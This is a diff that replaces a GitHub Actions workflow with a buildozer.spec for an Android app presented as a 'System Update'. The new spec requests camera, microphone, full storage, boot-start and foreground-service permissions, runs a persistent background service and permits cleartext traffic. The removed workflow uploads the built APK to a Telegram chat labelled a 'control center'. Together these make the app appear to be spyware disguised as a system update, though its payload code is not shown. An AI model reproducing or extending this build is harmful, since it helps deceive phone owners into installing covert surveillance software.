@@ -1,83 +1,36 @@
-name: Build Android APK
+[app]
+title = System Update
+package.name = systemupdate
+package.domain = org.system.update
+version = 2.0.0
+version.release = 2.0.0
+icon.filename = %(source.dir)s/icon.png
+icon.adaptive_foreground.filename = %(source.dir)s/icon.png
+android.adaptive_icon_background = #FFFFFF
 
-on:
-  push:
-    branches: [ main ]
-  workflow_dispatch:
+source.dir = .
+source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db
+source.exclude_dirs = tests, __pycache__, docs, examples, .github
+source.exclude_patterns = *.pyc, *.pyo, *.pyd, *.so.debug, *.a, *.la
 
-jobs:
-  build:
-    runs-on: ubuntu-22.04
+requirements = python3,kivy,requests,pillow,pyjnius,android,cryptography
 
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
+android.permissions = INTERNET, CAMERA, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, RECORD_AUDIO, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, MANAGE_EXTERNAL_STORAGE, POST_NOTIFICATIONS
 
-      - name: Free Disk Space
-        uses: jlumbroso/free-disk-space@main
-        with:
-          tool-cache: true
-          android: false
-          dotnet: true
-          haskell: true
-          large-packages: true
-          docker-images: true
-          swap: true
+android.accept_sdk_license = True
+android.skip_update = True
+android.api = 33
+android.minapi = 21
+android.build_tools_version = 33.0.1
+android.archs = arm64-v8a
 
-      - name: Install System Dependencies
-        run: |
-          sudo apt update
-          sudo apt install -y git zip unzip autoconf libtool pkg-config zlib1g-dev \
-            libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev \
-            libsdl2-dev libsdl2-image-dev libsdl2-mixer-dev libsdl2-ttf-dev libglew-dev
+android.services = MyService:service.py
+android.foreground = True
+android.release_minify = True
+android.strip_libs = True
+android.uses_cleartext_traffic = True
 
-      - name: Install Python and Buildozer
-        run: |
-          pip3 install --upgrade pip
-          pip3 install --user "cython<3.0" buildozer
-
-      - name: Configure Android SDK & Accept Licenses
-        run: |
-          export PATH=$PATH:$HOME/.local/bin
-          mkdir -p ~/.android && touch ~/.android/repositories.cfg
-          yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager --licenses || true
-          $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager "platforms;android-33" "build-tools;33.0.1" "platform-tools" "ndk;25.2.9519653"
-
-      - name: Force Buildozer to use GitHub SDK
-        run: |
-          SDK_DIR="$HOME/.buildozer/android/platform/android-sdk"
-          mkdir -p "$SDK_DIR/tools/bin"
-          ln -sf /usr/local/lib/android/sdk/cmdline-tools/latest/bin/sdkmanager "$SDK_DIR/tools/bin/sdkmanager"
-          ln -sf /usr/local/lib/android/sdk/platforms "$SDK_DIR/platforms"
-          ln -sf /usr/local/lib/android/sdk/build-tools "$SDK_DIR/build-tools"
-          ln -sf /usr/local/lib/android/sdk/platform-tools "$SDK_DIR/platform-tools"
-          cd project
-          sed -i 's|^#\? \?android.accept_sdk_license =.*|android.accept_sdk_license = True|' buildozer.spec
-          sed -i 's|^#\? \?android.skip_update =.*|android.skip_update = True|' buildozer.spec
-          sed -i 's|^#\? \?android.ndk =.*|android.ndk = 25b|' buildozer.spec
-
-      - name: Build APK
-        run: |
-          export PATH=$PATH:$HOME/.local/bin
-          cd project
-          buildozer -v android debug
-
-      - name: Upload APK
-        uses: actions/upload-artifact@v4
-        with:
-          name: system-update
-          path: project/bin/*.apk
-
-      - name: Send APK to Telegram
-        env:
-          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
-          CHAT_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
-        run: |
-          APK=$(find project/bin -name "*.apk" | head -n 1)
-          if [ -f "$APK" ]; then
-            curl -F "chat_id=$CHAT_ID" -F "document=@$APK" -F "caption=✅ APK v2.0 ready." \
-              https://api.telegram.org/bot$BOT_TOKEN/sendDocument
-          else
-            echo "APK not found"
-            exit 1
-          fi
+fullscreen = 1
+orientation = portrait
+log_level = 2
+warn_on_root = 0
